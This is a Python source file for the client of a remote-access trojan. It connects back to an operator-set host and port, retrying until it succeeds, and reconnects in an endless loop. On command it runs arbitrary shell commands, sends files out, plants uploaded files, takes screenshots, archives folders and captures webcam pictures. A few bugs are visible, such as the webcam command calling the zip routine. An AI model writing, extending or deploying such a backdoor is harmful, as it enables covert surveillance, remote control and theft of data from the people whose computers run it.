#!/usr/bin/env python3
# standard python libraries
import time
import threading
import subprocess
import base64
import socket
import sys
import os
import zipfile
import json
# non-standard libraries
import mss
import cv2


class Client:
    def __init__(self):
        self.connection = Connection()
        self.exit = False

        while not self.exit:
            request = json.loads(self.connection.recv(self.connection.sock).decode(self.connection.CODEC))
            self.response = {"data": "",
                             "error": ""}

            if request["cmd"] == "f":
                session = threading.Thread(target=self.cwd, args=(request["mode"], request["path"],))
                self.handle_session(session, request["timeout"])
            elif request["cmd"] == "c":
                session = threading.Thread(target=self.execute_command, args=(request["exe"],))
                self.handle_session(session, request["timeout"])
            elif request["cmd"] == "d":
                self.download_file(request["open_path"])
            elif request["cmd"] == "u":
                self.upload_file(request["save_path"])
            elif request["cmd"] == "s":
                session = threading.Thread(target=self.make_screenshot, args=(request["monitor"], request["save_path"],))
                self.handle_session(session, request["timeout"])
            elif request["cmd"] == "z":
                session = threading.Thread(target=self.zip_file_or_folder, args=(request["comp_lvl"], request["open_path"], request["save_path"],))
                self.handle_session(session, request["timeout"])
            elif request["cmd"] == "w":
                session = threading.Thread(target=self.zip_file_or_folder, args=(request["cam_port"], request["save_path"],))
                self.handle_session(session, request["timeout"])
            elif request["cmd"] == "r":
                session = threading.Thread(target=self.self.connection.sock.close)
                self.handle_session(session, request["timeout"])
                self.exit = True

            self.connection.send(self.enc_response(self.response), self.connection.sock)

    def cwd(self, mode, path):
        if mode == "set":
            try:
                os.chdir(path)
            except FileNotFoundError:
                self.response["error"] = "[-] FileNotFoundError"
            except PermissionError:
                self.response["error"] = "[-] PermissionError"
        else:
            self.response["data"] = os.getcwd()

    def execute_command(self, command):
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            data = process.stdout.read() + process.stderr.read()
            self.response["data"] = data
        except UnicodeDecodeError:
            self.response["error"] = "[-] UnicodeDecodeError"

    def download_file(self, path):
        try:
            with open(path, "rb") as file:
                data = base64.b64encode(file.read()) + self.connection.END_MARKER
        except FileNotFoundError:
            header = "[-] FileNotFoundError"
            self.connection.send(header.encode(self.connection.CODEC), self.connection.sock)
        except PermissionError:
            header = "[-] PermissionError"
            self.connection.send(header.encode(self.connection.CODEC), self.connection.sock)
        else:
            header = str(len(data)).encode(self.connection.CODEC)
            self.connection.send(header, self.connection.sock)
            self.connection.sock.send(data)

    def upload_file(self, path):
        data = self.connection.recv(self.connection.sock)
        with open(path, "wb") as file:
            file.write(data)

    def make_screenshot(self, monitor, path):
        try:
            with mss.mss() as sct:
                sct.shot(mon=int(monitor), output=path)
        except mss.exception.ScreenShotError:
            self.response["error"] = "[-] MonitorDoesNotExist"
        except ValueError:
            self.response["error"] = "[-] InvalidMonitorIndex"
        except FileNotFoundError:
            self.response["error"] = "[-] FileNotFoundError"

    def zip_file_or_folder(self, compression_level, path_to_open, path_to_save):
        try:
            zip_file = zipfile.ZipFile(path_to_save, 'w', zipfile.ZIP_DEFLATED, compresslevel=int(compression_level))
            if os.path.isdir(path_to_open):
                relative_path = os.path.dirname(path_to_open)
                for root, dirs, files in os.walk(path_to_open):
                    for file in files:
                        zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
            else:
                zip_file.write(path_to_open, os.path.basename(path_to_open))
            zip_file.close()
        except PermissionError:
            self.response["error"] = "[-] PermissionError"
        except FileNotFoundError:
            self.response["error"] = "[-] FileNotFoundError"

    def capture_camera_picture(self, camera_port, path_to_save):
        video_capture = cv2.VideoCapture(int(camera_port), cv2.CAP_DSHOW)
        if not video_capture.isOpened():
            self.response["error"] = "[-] CouldNotOpenDevice"
            return
        success, frame = video_capture.read()
        if not success:
            self.response["error"] = "[-] UnableToCapturePicture"
        video_capture.release()
        cv2.destroyAllWindows()
        cv2.imwrite(path_to_save, frame)

    def handle_session(self, session, timeout):
        session.start()
        session.join(timeout)
        if session.is_alive():
            self.response["error"] = "[-] TimeoutExpired"

    def dec_request(self, request):
        return json.loads(request.decode(self.connection.CODEC))

    def enc_response(self, response):
        return json.dumps(response).encode(self.connection.CODEC)


class Connection:
    def __init__(self):
        self.CODEC = "utf-8"
        self.END_MARKER = "-".encode(self.CODEC)
        self.PACKET_SIZE = 1024

        HOST = "127.0.0.1"
        PORT = 10000

        if len(sys.argv) == 3:
            try:
                HOST = str(sys.argv[1])
                PORT = int(sys.argv[2])
            except ValueError:
                print("[-] InvalidCommandlineArguments")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try:
                self.sock.connect((HOST, PORT))
                break
            except socket.error:
                time.sleep(30)

    def send(self, data, connection):
        data = base64.b64encode(data) + self.END_MARKER
        connection.send(data)

    def recv(self, connection):
        data = bytes()
        while not data.endswith(self.END_MARKER):
            data += connection.recv(self.PACKET_SIZE)
        return base64.b64decode(data[:-1])


if __name__ == "__main__":
    while True:
        #try:
        client = Client()
            #if client.exit:
                #break
        #except:
            #pass
